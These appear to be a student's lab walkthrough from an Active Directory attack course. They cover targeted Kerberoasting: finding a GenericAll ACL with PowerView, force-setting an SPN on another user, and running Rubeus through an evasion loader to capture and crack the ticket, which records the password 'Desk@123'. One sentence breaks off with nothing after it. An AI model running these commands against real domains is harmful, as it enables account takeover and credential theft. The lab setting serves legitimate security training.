
Task 
• Determine if studentuserx has permissions to set UserAccountControl flags for any user. 
• If yes, force set a SPN on the user and obtain a TGS for the user.


Let’s check if studentuser139 has permissions to set User Account Control settings for any user. Recall from a previous hands-on that we also scan ACLs if any group of which studentuser131 is a member has interesting permissions. Run the below PowerView command from InvisiShell:

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

![[Pasted image 20250315231622.png]]

PowerShell command is trying to find interesting domain ACLs (Access Control Lists) where the `IdentityReferenceName` matches `"StudentUsers"`. However, if it isn't working as expected, here are a few things to check and improve:

Let’s check if support131user already has a SPN. We can do it with PowerView or ActiveDirectory module. Use the below command from the Active Directory module:

```
Get-ADUser -Identity support131user -Properties ServicePrincipalName | select ServicePrincipalName
```

Since studentuser139 has GenericAll rights on the support131user, let’s force set a SPN on it. Using ActiveDirectory module:

```
Set-ADUser -Identity support131user -ServicePrincipalNames @{Add='us/myspn131'} -Verbose
```


Check again the SPN For support131user

```
Get-ADUser -Identity support131user -Properties ServicePrincipalName | select ServicePrincipalName
```

Now, we can Kerberoast the SPN: Once again, run the below command on the student VM to generate encoded arguments for "kerberoast"

```
C:\AD\Tools\ArgSplit.bat
```



```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:support131user /simple /rc4opsec /outfile:C:\AD\Tools\targetedhashes.txt
```


Let's brute-force the ticket now:


```
pass:Desk@123
```

